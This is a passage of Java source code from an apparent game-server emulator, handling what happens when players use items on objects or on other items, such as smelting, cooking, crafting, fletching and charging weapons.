package ethos.model.items;

import java.util.List;
import java.util.Optional;

import ethos.Config;
import ethos.Server;
import ethos.clip.ObjectDef;
import ethos.model.content.*;
import ethos.model.content.achievement.AchievementType;
import ethos.model.content.achievement.Achievements;
import ethos.model.content.achievement_diary.ardougne.ArdougneDiaryEntry;
import ethos.model.content.achievement_diary.fremennik.FremennikDiaryEntry;
import ethos.model.content.achievement_diary.varrock.VarrockDiaryEntry;
import ethos.model.content.trails.MasterClue;
import ethos.model.items.item_combinations.Godswords;
import ethos.model.minigames.warriors_guild.AnimatedArmour;
import ethos.model.players.Boundary;
import ethos.model.players.Player;
import ethos.model.players.PlayerAssistant;
import ethos.model.players.Right;
import ethos.model.players.combat.Degrade;
import ethos.model.players.mode.ModeType;
import ethos.model.players.packets.objectoptions.impl.DarkAltar;
import ethos.model.players.packets.objectoptions.impl.WellOfGoodWillObject;
import ethos.model.players.skills.Cooking;
import ethos.model.players.skills.Skill;
import ethos.model.players.skills.Smelting;
import ethos.model.players.skills.crafting.*;
import ethos.model.players.skills.firemake.Firemaking;
import ethos.model.players.skills.herblore.Crushable;
import ethos.model.players.skills.herblore.PoisonedWeapon;
import ethos.model.players.skills.herblore.UnfCreator;
import ethos.model.players.skills.prayer.Bone;
import ethos.model.players.skills.prayer.Prayer;
import ethos.model.players.skills.slayer.Slayer;
import ethos.util.Misc;

/**
 * @author Sanity
 * @author Ryan
 * @author Lmctruck30 Revised by Shawn Notes by Shawn
 */

public class UseItem {
	
	public static void unNoteItems(Player c, int itemId, int amount) {
		ItemDefinition definition = ItemDefinition.forId(itemId);
		int counterpartId = Server.itemHandler.getCounterpart(itemId);
		
		/**
		 * If a player enters an amount which is greater than the amount of the item they have it will set it to the amount
		 * they currently have.
		 */
		int amountOfNotes = c.getItems().getItemAmount(itemId);
		if (amount > amountOfNotes) {
			amount = amountOfNotes;
		}
		
		/**
		 * Stops if you are trying to unnote an unnotable item
		 */
		if (counterpartId == -1) {
			c.sendMessage("You can only use unnotable items on this bank to un-note them.");
			return;
		}
		/**
		 * Stops if you do not have the item you are trying to unnote
		 */
		if (!c.getItems().playerHasItem(itemId, 1)) {
			return;
		}
		
		/**
		 * Preventing from unnoting more items that you have space available
		 */
		if (amount > c.getItems().freeSlots()) {
			amount = c.getItems().freeSlots();
		}
		
		/**
		 * Stops if you do not have any space available
		 */
		if (amount <= 0) {
			c.sendMessage("You need at least one free slot to do this.");
			return;
		}
		
		/**
		 * Deletes the noted item and adds the amount of unnoted items
		 */
		c.getItems().deleteItem2(itemId, amount);
		c.getItems().addItem(counterpartId, amount);
		c.getDH().sendStatement("You unnote x"+amount+" of " + definition.getName() + ".");
		c.settingUnnoteAmount = false;
		c.unNoteItemId = 0;
		return;
	}

	/**
	 * Using items on an object.
	 * 
	 * @param c
	 * @param objectID
	 * @param objectX
	 * @param objectY
	 * @param itemId
	 */
	public static void ItemonObject(Player c, int objectID, int objectX, int objectY, int itemId) {
		if (!c.getItems().playerHasItem(itemId, 1))
			return;
		c.getFarming().patchObjectInteraction(objectID, itemId, objectX, objectY);
		ObjectDef def = ObjectDef.getObjectDef(objectID);

		if (def != null) {
			
			if (def.name != null && def.name.toLowerCase().contains("bank")) {
					//ItemDefinition definition = ItemDefinition.forId(itemId);
					boolean stackable = Item.itemStackable[itemId];
					if (stackable) {
						c.getOutStream().createFrame(27);
						c.unNoteItemId = itemId;
						c.settingUnnoteAmount = true;
					} else {
						PlayerAssistant.noteItems(c, itemId);
				}
			}
		}

		switch (objectID) {
		
			case 16469:
			case 2030: //Allows for ores to be used on the furnace instead of going though the interface.
				//if (itemId == )
				if (itemId == 19529) {
					if (c.getItems().playerHasItem(6571)) {
						c.getItems().deleteItem(19529, 1);
						c.getItems().deleteItem(6571, 1);
						c.getItems().addItem(19496, 1);
						c.sendMessage("You successfully bind the two parts together into an uncut zenyte.");
					} else {
						c.sendMessage("You need an uncut onyx to do this.");
						return;
					}
				} else {
					BraceletMaking.craftBraceletDialogue(c, itemId);
				}
				String type = itemId == 438 ? "bronze" : itemId == 436 ? "bronze" : itemId == 440 ? "iron" : itemId == 442 ? "silver" : itemId == 453 ? "steel" : itemId == 444 ? "gold" : itemId == 447 ? "mithril" : itemId == 449 ? "adamant" : itemId == 451 ? "rune" : "";			
				Smelting.startSmelting(c, type, "ALL", "FURNACE");
				
				break;
		
		case 28900:
			switch (itemId) {
			case 19675:
				DarkAltar.handleRechargeArcLight(c);
				break;
			case 6746:
				DarkAltar.handleDarklightTransaction(c);
			}
			break;
		case 7813:
			if (itemId == 6055) {
				c.getItems().deleteItem(6055, 28);
			}
			break;
		
		case 9380:
		case 9385:
		case 9344:
		case 9345:
		case 9348:
			if (itemId == 6713) {
				c.wrenchObject = objectID;
				Server.getGlobalObjects().remove(objectID, objectX, objectY, c.heightLevel);
				c.sendMessage("@cr10@Attempting to remove object..");
			}
			break;
		
		case 29878:
			WellOfGoodWillObject.handleInteraction(c, itemId);
			break;
		
		case 27029:
			if (itemId == 13273) {
				if (c.getItems().playerHasItem(13273)) {
					c.turnPlayerTo(3039, 4774);
					c.getDH().sendDialogues(700, -1);
				}
			}
			break;
		
		case 8927:
			switch (itemId) {
			case 1925:
			case 3727:
				c.getItems().deleteItem(1925, 1);
				c.getItems().addItem(1929, 1);
				c.sendMessage("You fill the bucket with water.");
				c.getDiaryManager().getFremennikDiary().progress(FremennikDiaryEntry.FILL_BUCKET);
				break;
			}
		
		case 3043:
		case 7143:
			if (itemId == 229) {
				if (Boundary.isIn(c, Boundary.VARROCK_BOUNDARY)) {
					c.getDiaryManager().getVarrockDiary().progress(VarrockDiaryEntry.FILL_VIAL);
					c.getItems().deleteItem(229, 1);
					c.getItems().addItem(227, 1);
				}
			}
			break;
			
		case 11744:
			if (c.getMode().isUltimateIronman()) {

			}
			break;
			
		case 14888:
			if (itemId == 19529) {
				if (c.getItems().playerHasItem(6571)) {
					c.getItems().deleteItem(19529, 1);
					c.getItems().deleteItem(6571, 1);
					c.getItems().addItem(19496, 1);
					c.sendMessage("You successfully bind the two parts together into an uncut zenyte.");
				} else {
					c.sendMessage("You need an uncut onyx to do this.");
					return;
				}
			} else {
				BraceletMaking.craftBraceletDialogue(c, itemId);
			}
			break;

		case 25824:
			c.turnPlayerTo(objectX, objectY);
			SpinMaterial.getInstance().spin(c, itemId);
			break;

		case 23955:
			AnimatedArmour.itemOnAnimator(c, itemId);
			break;
		case 878:
			if (c.getPoints().useItem(itemId)) {
				c.getPoints().sendConfirmation(itemId);
			}
			break;
		case 2783:
		case 6150:
		case 2097:
			c.getSmithingInt().showSmithInterface(itemId);
			
			switch (itemId) {
			
			case 11286:
			case 1540:
					if (c.playerLevel[Player.playerSmithing] >= 90) {
						if (!c.getItems().playerHasItem(1540) || !c.getItems().playerHasItem(11286) || !c.getItems().playerHasItem(2347)) {
							c.sendMessage("You must have a draconic visage, dragonfire shield and a hammer in order to do this.");
							return;
						}
						c.startAnimation(898);
						c.getItems().deleteItem(1540, c.getItems().getItemSlot(1540), 1);
						c.getItems().deleteItem(11286, c.getItems().getItemSlot(11286), 1);
						c.getItems().addItem(11284, 1);
						c.getDH().sendItemStatement("You combine the two materials to create a dragonfire shield.", 11284);
						c.getPA().addSkillXP(500 * (c.getMode().getType().equals(ModeType.OSRS) ? 1 : Config.SMITHING_EXPERIENCE), Player.playerSmithing, true);
					} else {
						c.sendMessage("You need a smithing level of 90 to create a dragonfire shield.");
					}
				break;
			}
			break;
		case 172:
			CrystalChest.searchChest(c);
			break;

		case 12269:
		case 2732:
		case 3039:
		case 114:
		case 5249:
		case 2728:
		case 26185:
		case 4488:
		case 27724:
		case 7183:
		case 26181:
			c.turnPlayerTo(objectX, objectY);
			Cooking.cookThisFood(c, itemId, objectID);
			break;

		case 409:
			Optional<Bone> bone = Prayer.isOperableBone(itemId);
			if (bone.isPresent()) {
				c.getPrayer().setAltarBone(bone);
				c.getOutStream().createFrame(27);
				c.settingUnnoteAmount = false;
				c.boneOnAltar = true;
				return;
			}
			break;
		/*
		 * case 2728: case 12269: c.getCooking().itemOnObject(itemId); break;
		 */
		default:
			if (c.debugMessage)
				c.sendMessage("Player At Object id: " + objectID + " with Item id: " + itemId);
			break;
		}

	}

	/**
	 * Using items on items.
	 * 
	 * @param c
	 * @param itemUsed
	 * @param useWith
	 */
	public static void ItemonItem(final Player c, final int itemUsed, final int useWith, final int itemUsedSlot, final int usedWithSlot) {
		GameItem gameItemUsed = new GameItem(itemUsed, c.playerItemsN[itemUsedSlot], itemUsedSlot);
		GameItem gameItemUsedWith = new GameItem(useWith, c.playerItemsN[itemUsedSlot], usedWithSlot);
		c.getPA().resetVariables();
		List<ItemCombinations> itemCombinations = ItemCombinations.getCombinations(new GameItem(itemUsed), new GameItem(useWith));
		if (itemCombinations.size() > 0) {
			for (ItemCombinations combinations : itemCombinations) {
				ItemCombination combination = combinations.getItemCombination();
				if (combination.isCombinable(c)) {
					c.setCurrentCombination(Optional.of(combination));
					c.dialogueAction = -1;
					c.nextChat = -1;
					combination.showDialogue(c);
					return;
				} else if (itemCombinations.size() == 1) {
					c.getDH().sendStatement("You don't have all of the items required for this combination.");
					return;
				}
			}
		}
		if (itemUsed == 1775 || useWith == 1775) {
			if (!c.getItems().playerHasItem(1785)) {
				c.sendMessage("In order to do this you must have a glassblowing pipe.");
				return;
			}
			GlassBlowing.makeGlass(c, itemUsed, useWith);
		}
		if (itemUsed == 2425 && useWith == 10499) {
			c.getItems().deleteItem(2425, 1);
			c.getItems().deleteItem(10499, 1);
			c.getItems().addItem(22109, 1);
			c.getDH().sendItemStatement("You sucessfully make the Ava's Assembler", 22109);

		}
		if (itemUsed == 3155 && useWith == 3157) {
			c.getItems().deleteItem(3155, 1);
			c.getItems().deleteItem(3157, 1);
			c.getItems().addItem(3159, 1);
			//c.getDH().sendItemStatement("You sucessfully make the Ava's Assembler", 22109);

		}
		if (c.getFletching().fletchBolt(itemUsed, useWith)) {
			return;
		}
		if (c.getFletching().fletchBolt(useWith, itemUsed)) {
			return;
		}
		if (itemUsed == 1743 && useWith == 1733/* || itemUsed == 1733 || useWith == 1743*/) {
			if (!c.getItems().playerHasItem(1734)) {
				c.sendMessage("You need some thread!");
				return;
			}
			if (c.playerLevel[12] >= 28) {
				c.startAnimation(1249);
				c.getItems().deleteItem(1734, c.getItems().getItemSlot(1734), 1);
				c.getItems().deleteItem2(1743, 1);
				c.getItems().addItem(1131, 1);
				c.getPA().addSkillXP(35 * (c.getMode().getType().equals(ModeType.OSRS) ? 1 : Config.CRAFTING_EXPERIENCE), 12, true);
				//c.sendMessage("Crafting hardleather body.");
			} else {
				c.sendMessage("You need 28 crafting to do this.");
			}
		}
//		if (Firemaking.playerLogs(c, itemUsed, useWith)) {
//			if (Region.getClipping(c.absX, c.absY, c.heightLevel) != 0 || Server.getGlobalObjects().anyExists(c.absX, c.absY, c.heightLevel) || c.inBank() || Boundary.isIn(c, Boundary.DUEL_ARENA)) {
//				c.sendMessage("You cannot light a fire here.");
//				return;
//			}
//			Firemaking.grabData(c, itemUsed, useWith);
//		}          
		
		if (useWith >= 13579 && useWith <= 13678 || useWith >= 21061 && useWith <= 21076) {
			if (!c.getItems().isNoted(useWith)) {
				if (itemUsed == 3188) {
					if (!c.getItems().playerHasItem(useWith)) {
						return;
					}
					c.getItems().deleteItem2(useWith, 1);
					if (Item.getItemName(useWith).contains("hood")) {
						c.getItems().addItem(11850, 1);
					} else if (Item.getItemName(useWith).contains("cape")) {
						c.getItems().addItem(11852, 1);
					} else if (Item.getItemName(useWith).contains("top")) {
						c.getItems().addItem(11854, 1);
					} else if (Item.getItemName(useWith).contains("legs")) {
						c.getItems().addItem(11856, 1);
					} else if (Item.getItemName(useWith).contains("gloves")) {
						c.getItems().addItem(11858, 1);
					} else if (Item.getItemName(useWith).contains("boots")) {
						c.getItems().addItem(11860, 1);
					}
					c.sendMessage("You reverted your graceful piece.");
				}
			}
		}
		
		switch (useWith) {
		case 3016:
		case 12640:
			if (itemUsed == 12640 || itemUsed == 3016) {
				if (c.playerLevel[Skill.HERBLORE.getId()] < 77) {
					c.sendMessage("You need a herblore level of 77 to make Stamina potion.");
					return;
				}
				if (!c.getItems().playerHasItem(12640, 4) && !c.getItems().playerHasItem(3016)) {
					c.sendMessage("You must have 4 amylase crystals and a Super energy potion to do this.");
					return;
				}
				c.getItems().deleteItem(3016, 1);
				c.getItems().deleteItem(12640, 3);
				c.getItems().addItem(12625, 1);
				c.getPA().addSkillXP(152 * (c.getMode().getType().equals(ModeType.OSRS) ? 1 : Config.HERBLORE_EXPERIENCE), Skill.HERBLORE.getId(), true);
				c.sendMessage("You combine all of the ingredients and make a Stamina potion.");
				Achievements.increase(c, AchievementType.HERB, 1);
			}
			break;
		/*case 12791:
			c.getRunePouch().addItemToRunePouch(itemUsed, c.getItems().getItemAmount(itemUsed));
			break;*/
			
		case 590:
			Firemaking.lightFire(c, itemUsed, "tinderbox");
			break;
		
		case 12773:
		case 12774:
			if (itemUsed == 3188) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().addItem(4151, 1);
				c.sendMessage("You cleaned the whip.");
			}
			break;
			
			/**
			 * Light ballista
			 */
		case 19586:
			if (itemUsed == 19592) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().deleteItem2(itemUsed, 1);
				c.getItems().addItem(19595, 1);
				c.sendMessage("You combined the two items and got an incomplete ballista.");
			}
			break;
			
			/**
			 * Heavy Ballista
			 */
		case 19589:
			if (itemUsed == 19592) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().deleteItem2(itemUsed, 1);
				c.getItems().addItem(19598, 1);
				c.sendMessage("You combined the two items and got an incomplete ballista.");
			}
			break;
			
			/**
			 * Both heavy and light ballista
			 */
		case 19601:
			if (itemUsed == 19598) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().deleteItem2(itemUsed, 1);
				c.getItems().addItem(19607, 1);
				c.sendMessage("You combined the two items and got an unstrung ballista.");
			}
			if (itemUsed == 19595) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().deleteItem2(itemUsed, 1);
				c.getItems().addItem(19604, 1);
				c.sendMessage("You combined the two items and got an unstrung ballista.");
			}
			break;
		case 19610:
			if (itemUsed == 19607) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().deleteItem2(itemUsed, 1);
				c.getItems().addItem(19481, 1);
				c.sendMessage("You combined the two items and got a heavy ballista.");
			}
			if (itemUsed == 19604) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().deleteItem2(itemUsed, 1);
				c.getItems().addItem(19478, 1);
				c.sendMessage("You combined the two items and got a light ballista.");
			}
			break;
		
		case 11941:
			if (c.getItems().isStackable(itemUsed)) {
				c.sendMessage("You can only deposit stackable items while in deposit mode.");
				return;
			}
				c.getLootingBag().deposit(itemUsed, 1);
			break;
			
		case 13226:
			c.getHerbSack().addItemToHerbSack(itemUsed, c.getItems().getItemAmount(itemUsed));
			break;
			
		case 12020:
			c.getGemBag().addItemToGemBag(itemUsed, c.getItems().getItemAmount(itemUsed));
			break;
		
		case 13280:
			switch (itemUsed) {
			case 13124:
				SkillcapePerks.mixCape(c, "ARDOUGNE");
				break;
				
			case 6570:
				SkillcapePerks.mixCape(c, "FIRE");
				break;

			case 10499:
				SkillcapePerks.mixCape(c, "AVAS");
				break;

			case 2412:
				SkillcapePerks.mixCape(c, "SARADOMIN");
				break;

			case 2413:
				SkillcapePerks.mixCape(c, "GUTHIX");
				break;

			case 2414:
				SkillcapePerks.mixCape(c, "ZAMORAK");
				break;
				case 21791:
					SkillcapePerks.mixCape(c, "SARADOMINi");
					break;

				case 21793:
					SkillcapePerks.mixCape(c, "GUTHIXi");
					break;

				case 21795:
					SkillcapePerks.mixCape(c, "ZAMORAKi");
					break;
			}
			break;
		}
		switch (itemUsed) {
		case 985:
		case 987:
		CrystalChest.makeKey(c);
			break;
		
		case 590:
			Firemaking.lightFire(c, useWith, "tinderbox");
			break;
			
		case 12792:
			RecolourGraceful.ITEM_TO_RECOLOUR = useWith;
			c.getDH().sendDialogues(55, -1);
			break;
		}
		if (itemUsed == 1042 && useWith == 12337 || useWith == 1042 && itemUsed == 12337) {
			c.getItems().deleteItem2(1042, 1);
			c.getItems().deleteItem2(12337, 1);
			c.getItems().addItem(12399, 1);
			c.sendMessage("You combine the spectacles and the hat to make a partyhat and specs.");
			return;
		}
		if (itemUsed == 3150 && useWith == 3157 || itemUsed == 3157 && useWith == 3150) {
			if (c.getItems().playerHasItem(3150) && c.getItems().playerHasItem(3157)) {
				c.getItems().deleteItem2(itemUsed, 1);
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().addItem(3159, 1);
			}
		}
		if (itemUsed == 12929 || useWith == 12929) {
			if (useWith == 13200 || itemUsed == 13200 || useWith == 13201 || itemUsed == 13201) {
				c.getItems().deleteItem2(useWith, 1);
				c.getItems().deleteItem2(itemUsed, 1);
				int mutagen = useWith == 13200 || itemUsed == 13200 ? 13196 : 13198;
				c.getItems().addItem(mutagen, 1);
			}
		}
		if (itemUsed == 12932 && useWith == 11791 || itemUsed == 11791 && useWith == 12932) {
			if (c.playerLevel[Skill.CRAFTING.getId()] < 59) {
				c.sendMessage("You need 59 crafting to do this.");
				return;
			}
			if (!c.getItems().playerHasItem(1755)) {
				c.sendMessage("You need a chisel to do this.");
				return;
			}
			c.getItems().deleteItem2(itemUsed, 1);
			c.getItems().deleteItem2(useWith, 1);
			c.getItems().addItem(12902, 1);
			c.sendMessage("You attach the magic fang to the trident and create an uncharged toxic staff of the dead.");
			return;
		}
		if (itemUsed == 12932 && useWith == 11907 || itemUsed == 11907 && useWith == 12932) {
			if (c.playerLevel[Skill.CRAFTING.getId()] < 59) {
				c.sendMessage("You need 59 crafting to do this.");
				return;
			}
			if (!c.getItems().playerHasItem(1755)) {
				c.sendMessage("You need a chisel to do this.");
				return;
			}
			if (c.getTridentCharge() > 0) {
				c.sendMessage("You cannot do this whilst your trident has charge.");
				return;
			}
			c.getItems().deleteItem2(itemUsed, 1);
			c.getItems().deleteItem2(useWith, 1);
			c.getItems().addItem(12899, 1);
			c.sendMessage("You attach the magic fang to the trident and create a trident of the swamp.");
			return;
		}
		if (itemUsed == 21347 && useWith == 1755 || itemUsed == 1755 && useWith == 21347) {
			c.getItems().handleAmethyst();
			return;
		}

		if (itemUsed == 554 || itemUsed == 560 || itemUsed == 562) {
			if (useWith == 11907)
				c.getDH().sendDialogues(52, -1);
		}
		if (itemUsed == 554 || itemUsed == 560 || itemUsed == 562 || itemUsed == 12934) {
			if (useWith == 12899) {
				c.getDH().sendDialogues(53, -1);
			}
		}

		// if (((itemUsed == 554 || itemUsed == 560 || itemUsed == 562) &&
		// (useWith == 12899 || useWith == 11907)) ||
		// ((useWith == 554 || useWith == 560 || useWith == 562) &&
		// (itemUsed == 12899 || itemUsed == 11907))) {
		// int trident;
		// if (itemUsed == 11907 || itemUsed == 12899) {
		// trident = itemUsed;
		// } else if (useWith == 11907 || useWith == 12899) {
		// trident = useWith;
		// } else {
		// return;
		// }
		// if (!c.getItems().playerHasItem(995, 10000) && trident == 11907) {
		// c.sendMessage("You need at least 10,000 coins to add charge.");
		// return;
		// }
		// if (!c.getItems().playerHasItem(12934, 100) && trident == 12899) {
		// c.sendMessage("You need 100 zulrah scales to charge this.");
		// return;
		// }
		// if (!c.getItems().playerHasItem(554, 50)) {
		// c.sendMessage("You need at least 50 fire runes to add charge.");
		// return;
		// }
		// if (!c.getItems().playerHasItem(560, 10)) {
		// c.sendMessage("You need at least 10 death rune to add charge.");
		// return;
		// }
		// if (!c.getItems().playerHasItem(562, 10)) {
		// c.sendMessage("You need at least 10 chaos rune to add charge.");
		// return;
		// }
		// if (c.getTridentCharge() >= 2500 && trident == 11907) {
		// c.sendMessage("Your trident already has 2,500 charge.");
		// return;
		// }
		// if (c.getToxicTridentCharge() >= 2500 && trident == 12899) {
		// c.sendMessage("Your trident already has 2,500 charge.");
		// return;
		// }
		// c.getItems().deleteItem2(554, 50);
		// c.getItems().deleteItem2(560, 10);
		// c.getItems().deleteItem2(562, 10);
		// if (trident == 11907) {
		// c.getItems().deleteItem2(995, 10000);
		// c.setTridentCharge(c.getTridentCharge() + 10);
		// } else {
		// c.getItems().deleteItem2(12934, 100);
		// c.setToxicTridentCharge(c.getToxicTridentCharge() + 10);
		// }
		// return;
		// }
		if (itemUsed == 12927 && useWith == 1755 || itemUsed == 1755 && useWith == 12927) {
			int visage = itemUsed == 12927 ? itemUsed : useWith;
			if (c.playerLevel[Skill.CRAFTING.getId()] < 52) {
				c.sendMessage("You need a crafting level of 52 to do this.");
				return;
			}
			c.getItems().deleteItem2(visage, 1);
			c.getItems().addItem(12929, 1);
			c.sendMessage("You craft the serpentine visage into a serpentine helm (empty).");
			c.sendMessage("Charge the helm with 11,000 scales.");
			return;
		}

		if (itemUsed == 12934 && useWith == 12902 || itemUsed == 12902 && useWith == 12934) {
			if (!c.getItems().playerHasItem(12902)) {
				c.sendMessage("You need the uncharged toxic staff of the dead to do this.");
				return;
			}
			if (!c.getItems().playerHasItem(12934, 11000)) {
				c.sendMessage("You need 11,000 scales to do this.");
				return;
			}
			if (c.getToxicStaffOfTheDeadCharge() > 0) {
				c.sendMessage("You must uncharge your current toxic staff of the dead to re-charge.");
				return;
			}
			int amount = c.getItems().getItemAmount(12934);
			if (amount > 11000) {
				amount = 11000;
				c.sendMessage("The staff only required 11,000 zulrah scales to fully charge.");
			}
			c.getItems().deleteItem2(12934, amount);
			c.getItems().deleteItem2(12902, 1);
			c.getItems().addItem(12904, 1);
			c.setToxicStaffOfTheDeadCharge(amount);
			c.sendMessage("You charge the toxic staff of the dead for " + amount + " zulrah scales.");
			return;
		}

		if (itemUsed == 12929 || itemUsed == 13196 || itemUsed == 13198 || useWith == 12929 || useWith == 13196 || useWith == 13198) {
			int helm = itemUsed == 12929 || itemUsed == 13196 || itemUsed == 13198 ? itemUsed : useWith;
			if (useWith == 12934 || itemUsed == 12934) {
				//if (!c.getItems().playerHasItem(12934, 11000)) {
				//	c.sendMessage("You need 11,000 scales to do this.");
				//	return;
				//}
				if (c.getSerpentineHelmCharge() > 0) {
					c.sendMessage("You must uncharge your current helm to re-charge.");
					return;
				}
				int amount = c.getItems().getItemAmount(12934);
				if (amount > 11000) {
					amount = 11000;
					c.sendMessage("The helm only required 11,000 zulrah scales to fully charge.");
				}
				c.getItems().deleteItem2(12934, amount);
				c.getItems().deleteItem2(helm, 1);
				c.getItems().addItem(helm == 12929 ? 12931 : helm == 13196 ? 13197 : 13199, 1);
				c.setSerpentineHelmCharge(amount);
				c.sendMessage("You charge the " + ItemDefinition.forId(helm).getName() + " helm for " + amount + " zulrah scales.");
				return;
			}
		}
		if (itemUsed == 12924 || useWith == 12924) {
			int ammo = itemUsed == 12924 ? useWith : itemUsed;
			ItemDefinition definition = ItemDefinition.forId(ammo);
			int amount = c.getItems().getItemAmount(ammo);
			if (ammo == 12934) {
				c.sendMessage("Select a dart to store and have the equivellent amount of scales.");
				return;
			}
			int darts[] = { 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 5628, 5629, 5630, 5632, 5633, 5634, 5635, 5636, 5637, 5639, 5640, 5641, 11230, 11231, 11233,
					11234 };
			if (definition == null || Misc.linearSearch(darts, ammo) == -1) {
				c.sendMessage("That item cannot be equipped with the blowpipe.");
				return;
			}
			if (c.getToxicBlowpipeAmmo() > 0) {
				c.sendMessage("The blowpipe already has ammo, you need to unload it first.");
				return;
			}
			if (amount < 100) {
				c.sendMessage("You need 100 of this item to store it in the pipe.");
				return;
			}
			if (!c.getItems().playerHasItem(12934, amount)) {
				c.sendMessage("You need at least " + amount + " scales in combination with the " + definition.getName() + " to charge this.");
				return;
			}
			if (!c.getItems().playerHasItem(12924)) {
				c.sendMessage("You need a toxic blowpipe (empty) to do this.");
				return;
			}
			if (amount > 16383) {
				c.sendMessage("The blowpipe can only store 16,383 charges at any given time.");
				amount = 16383;
			}
			c.getItems().deleteItem2(12924, 1);
			c.getItems().addItem(12926, 1);
			c.getItems().deleteItem2(ammo, amount);
			c.getItems().deleteItem2(12934, amount);
			c.setToxicBlowpipeCharge(amount);
			c.setToxicBlowpipeAmmo(ammo);
			c.setToxicBlowpipeAmmoAmount(amount);
			c.sendMessage("You store " + amount + " " + definition.getName() + " into the blowpipe and charge it with scales.");
			return;
		}
		if (itemUsed == 12922 && useWith == 1755 || itemUsed == 1755 && useWith == 12922) {
			if (c.playerLevel[Skill.FLETCHING.getId()] >= 53) {
				c.getItems().deleteItem2(12922, 1);
				c.getItems().addItem(12924, 1);
				c.getPA().addSkillXP(10000, Skill.FLETCHING.getId(), true);
				c.sendMessage("You fletch the fang into a toxic blowpipe.");
			} else {
				c.sendMessage("You need a fletching level of 53 to do this.");
			}
			return;
		}
		//Start of Rock Golems
		if (itemUsed == 438 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(438, 1);
			c.getItems().addItem(21187, 1);
		}
		if (itemUsed == 436 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(436, 1);
			c.getItems().addItem(21188, 1);
		}
		if (itemUsed == 440 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(440, 1);
			c.getItems().addItem(21189, 1);
		}
		if (itemUsed == 453 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(453, 1);
			c.getItems().addItem(21192, 1);
		}
		if (itemUsed == 444 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(444, 1);
			c.getItems().addItem(21193, 1);
		}
		if (itemUsed == 447 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(447, 1);
			c.getItems().addItem(21194, 1);
		}
		if (itemUsed == 449 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(449, 1);
			c.getItems().addItem(21196, 1);
		}
		if (itemUsed == 451 && useWith == 13321) {
			c.getItems().deleteItem2(13321, 1);
			c.getItems().deleteItem2(451, 1);
			c.getItems().addItem(21197, 1);
		}
		//Cleaning
		if (itemUsed == 3188 && useWith == 21187) {
			c.getItems().deleteItem2(21187, 1);
			c.getItems().addItem(13321, 1);
		}
		if (itemUsed == 3188 && useWith == 21188) {
			c.getItems().deleteItem2(21188, 1);
			c.getItems().addItem(13321, 1);
		}
		if (itemUsed == 3188 && useWith == 21189) {
			c.getItems().deleteItem2(21189, 1);
			c.getItems().addItem(13321, 1);
		}
		if (itemUsed == 3188 && useWith == 21192) {
			c.getItems().deleteItem2(21192, 1);
			c.getItems().addItem(13321, 1);
		}
		if (itemUsed == 3188 && useWith == 21193) {
			c.getItems().deleteItem2(21193, 1);
			c.getItems().addItem(13321, 1);
		}
		if (itemUsed == 3188 && useWith == 21194) {
			c.getItems().deleteItem2(21194, 1);
			c.getItems().addItem(13321, 1);
		}
		if (itemUsed == 3188 && useWith == 21196) {
			c.getItems().deleteItem2(21196, 1);
			c.getItems().addItem(13321, 1);
		}
		if (itemUsed == 3188 && useWith == 21197) {
			c.getItems().deleteItem2(21197, 1);
			c.getItems().addItem(13321, 1);
		}
		//End
		if (itemUsed == 53 || useWith == 53) {
			int arrow = itemUsed == 53 ? useWith : itemUsed;
			c.getFletching().fletchArrow(arrow);
		}
		if (itemUsed == 19584 || useWith == 19584) {
			int javelin = itemUsed == 19584 ? useWith : itemUsed;
			c.getFletching().fletchJavelin(javelin);
		}
		if (itemUsed == 52 && useWith == 314 || itemUsed == 314 && useWith == 52) {
			c.getFletching().fletchHeadlessArrows();
		}
		if (itemUsed == 1777 || useWith == 1777) {
			int unstrung = itemUsed == 1777 ? useWith : itemUsed;
			c.getFletching().fletchUnstrung(unstrung);
		}
		if (itemUsed == 9438 || useWith == 9438) {
			int unstrung = itemUsed == 9438 ? useWith : itemUsed;
			c.getFletching().fletchUnstrungCross(unstrung);
		}
		if (itemUsed == 314 || useWith == 314) {
			int item = itemUsed == 314 ? useWith : itemUsed;
			c.getFletching().fletchUnfinishedBolt(item);
			c.getFletching().fletchDart(item);
		}
		if (itemUsed == 1733 || useWith == 1733) {
			LeatherMaking.craftLeatherDialogue(c, itemUsed, useWith);
		}
		if (itemUsed == 1391 || useWith == 1391) {
			BattlestaveMaking.craftBattlestaveDialogue(c, itemUsed, useWith);
		}
		if (itemUsed == 1759 || useWith == 1759) {
			JewelryMaking.stringAmulet(c, itemUsed, useWith);
		}
		if (itemUsed == 1755 || useWith == 1755) {
			c.getFletching().fletchGem(useWith, itemUsed);
			c.getCrafting().cut(useWith, itemUsed);
		}
		if (useWith == 946 || itemUsed == 946) {
			c.getFletching().combine(useWith, itemUsed);
		}
		if (itemUsed == 12526 && useWith == 6585 || itemUsed == 6585 && useWith == 12526) {
			c.getDH().sendDialogues(580, -1);
		}
		if (itemUsed == 11235 || useWith == 11235) {
			if (itemUsed == 11235 && useWith == 12757 || useWith == 11235 && itemUsed == 12757) {
				c.getDH().sendDialogues(566, 315);
			} else if (itemUsed == 11235 && useWith == 12759 || useWith == 11235 && itemUsed == 12759) {
				c.getDH().sendDialogues(569, 315);
			} else if (itemUsed == 11235 && useWith == 12761 || useWith == 11235 && itemUsed == 12761) {
				c.getDH().sendDialogues(572, 315);
			} else if (itemUsed == 11235 && useWith == 12763 || useWith == 11235 && itemUsed == 12763) {
				c.getDH().sendDialogues(575, 315);
			}
		}
		if (itemUsed == 12804 && useWith == 11838 || itemUsed == 11838 && useWith == 12804) {
			// c.getDH().sendDialogues(550, -1);
		}
		if (itemUsed == 12802 || useWith == 12802) {
